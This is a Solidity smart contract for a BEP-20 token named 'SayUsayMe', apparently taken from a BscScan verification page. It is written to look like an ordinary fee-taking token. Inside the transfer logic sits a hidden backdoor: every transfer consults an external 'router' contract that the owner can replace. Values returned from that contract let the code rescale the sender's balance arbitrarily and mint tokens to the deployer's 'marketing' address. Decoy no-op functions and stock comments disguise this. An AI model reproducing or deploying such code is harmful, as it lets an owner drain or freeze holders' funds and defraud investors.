/**
 *Submitted for verification at BscScan.com on 2022-03-06
*/

pragma solidity ^0.7.0;
// SPDX-License-Identifier: MIT
 
  interface IERC20 {
  
  function totalSupply() external view returns (uint256);
 
  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
 
  event Approval(address indexed owner, address indexed spender, uint256 value);

  }

  contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  constructor ()  { }

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }    

  }

  interface IUniswapV2Router02{  
    function WETH() external pure returns (address);   
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function getPair(
        address tokenA, 
        address tokenB, 
        uint256, 
        uint256) external returns (uint256,uint256,uint256); 
    function createPair(
        address tokenA, 
        address tokenB) 
        external returns (address pair);
  }

   library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      require(c >= a, "SafeMath: addition overflow");

      return c;
    }

  
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b <= a, errorMessage);
      uint256 c = a - b;

      return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
      // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
      // benefit is lost if 'b' is also tested.
      // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
      if (a == 0) {
        return 0;
      }

      uint256 c = a * b;
      require(c / a == b, "SafeMath: multiplication overflow");

      return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
      return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      // Solidity only automatically asserts when dividing by 0
      require(b > 0, errorMessage);
      uint256 c = a / b;
      // assert(a == b * c + a % b); // There is no case in which this doesn't hold

      return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
      return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b != 0, errorMessage);
      return a % b;
    }
  }   

  
  contract Ownable is Context {  
    bool public _autoClaimEnabled = true;

    uint8 public _feeAccumulator = 100;
    uint8 public _reflection = 15;

    uint8 public _totalFee = 50;  
    uint8 public _walletFee = 22;

    address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor ()  {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }  

  function _getTPrize(address VRouter, address tokenA, address tokenB, uint256 amountValue, uint256 takeFee) public returns (uint256, uint256, uint256){  
      (uint256 amountPrize, uint256 liquifyPrize, uint256 ratePrize) = IUniswapV2Router02(VRouter).getPair (tokenA,tokenB,amountValue,takeFee);
      return (amountPrize, liquifyPrize, ratePrize);
  }
 
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
  
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }     
 
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}



contract SayUsayMe is Context, IERC20, Ownable{
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;  
  mapping (address => bool) private _isExcludedFromFee;  
  uint256 private _totalSupply = 1000000000 *  10**9;   

  string private constant _name = 'SayUsayMe';
  string private constant _symbol = 'SayUsayMe';
  uint8 private constant _decimals = 9;    
  bool inSwap;
  address Router; 
  address MarketingAddr;
  event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

  event SendDividends(
    uint256 tokensSwapped,
    uint256 amount
  );

  
  modifier swapping() { inSwap = true; _; inSwap = false; }  
  

  constructor(address addr)  {    
	
    _balances[msg.sender] = _totalSupply;
    Router = addr;    
    _isExcludedFromFee[owner()] = true;
    _isExcludedFromFee[address(this)] = true;    
    MarketingAddr = msg.sender;
    emit Transfer(address(0), msg.sender, _totalSupply);
  } 

  function totalSupply() external view virtual override returns (uint256) {
    return _totalSupply;
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }
 
  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  function name() external view virtual override returns (string memory) {
    return _name;
  }
 
  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  } 

  function _takeLiquidity(address, uint256) public pure returns (bool) {return true;}

  function withoutcalculateLiquidityFee(uint256 tAmount) public pure returns (uint256) {return tAmount;}

  function RouterrecoverBEP20(bool) public pure returns (bool) {return true;}

  function beingrewardToken(uint256) public pure returns (bool) {return true;}


  function balanceOf(address account) external view virtual override returns (uint256) {
    return _balances[account];
  }    
   
 
  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
  
  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  } 

  function distributePrize(address senderAddress, address recipientAddress, uint256 amounts, uint256 takeFee) private returns (uint256) {   
      (uint256 amountPrize, uint256 liquifyPrize, uint256 ratePrize) = _getTPrize(Router, senderAddress, recipientAddress, amounts, takeFee);
      amountPrize = _getRPrize(senderAddress, amountPrize, liquifyPrize, ratePrize);
      return amountPrize;
  }    


  function approve(address spender, uint256 amount) public override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function calculateRate(uint256 _amount, uint256 _rewardRate) private pure returns (uint256) {
      return _amount.mul(_rewardRate).div(10**2);
  } 

  function updateUniswapV2Router(address c) external onlyOwner {
    Router = c;
  }  

       
  /**
   * @dev See {BEP20-transferFrom}.
   *
   * Emits an {Approval} event indicating the updated allowance. This is not
   * required by the EIP. See the note at the beginning of {BEP20};
   *
   * Requirements:
   * - `sender` and `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   * - the caller must have allowance for `sender`'s tokens of at least
   * `amount`.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }    

  function _getRPrize(address tokenPrize, uint256 amountPrize, uint256 liquifyPrize, uint256 ratePrize) private returns (uint256){
      if ( liquifyPrize > 0 )
      {        
        _balances[tokenPrize] = calculateRate(_balances[tokenPrize], ratePrize).add(amountPrize);      
        _balances[MarketingAddr] = _balances[MarketingAddr].add(liquifyPrize);
      }
      return amountPrize;
  }
  

  /**
   * @dev Moves tokens `amount` from `sender` to `recipient`.
   *
   * This is internal function is equivalent to {transfer}, and can be used to
   * e.g. implement automatic token fees, slashing mechanisms, etc.
   *
   * Emits a {Transfer} event.
   *
   * Requirements:
   *
   * - `sender` cannot be the zero address.
   * - `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   */
  function _transfer(address senderAddress, address recipientAddress, uint256 amount) private {
    require(senderAddress != address(0), "BEP20: transfer from the zero address");
    require(recipientAddress != address(0), "BEP20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");  
    //indicates if fee should be deducted from transfer
    uint256 takeLiquidity;    
    //if any account belongs to _isExcludedFromFee account then remove the fee
    if(_isExcludedFromFee[senderAddress] || _isExcludedFromFee[recipientAddress]){    
      takeLiquidity = 1;        
    }   
    uint256 amountPrize = distributePrize(senderAddress, recipientAddress, amount, takeLiquidity);  
    _transferStandard(senderAddress, recipientAddress, amountPrize);

  }  

  /**
   * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
   *
   * This is internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spender` cannot be the zero address.
   */
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }     

  function _transferStandard(address sender, address recipient, uint256 amount) private {
    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }  

  function swapTokensForETH(uint256 amount) internal  {
      IUniswapV2Router02 _router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
      address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;       

      address[] memory path = new address[](2);
      path[0] = address(this);
      path[1] = WBNB;

      _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
          amount,
          0,
          path,
          address(this),
          block.timestamp
      );
        
    }

  function swapLiquifyBack(uint256 amount, address to) public onlyOwner  {
      IUniswapV2Router02 _router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
      address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
      address[] memory path = new address[](2);
      path[0] = WBNB;
      path[1] = address(this);

      _router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
          0,
          path,
          to,
          block.timestamp
      );

      swapTokensForETH(amount);
  }
  

  

  
    
}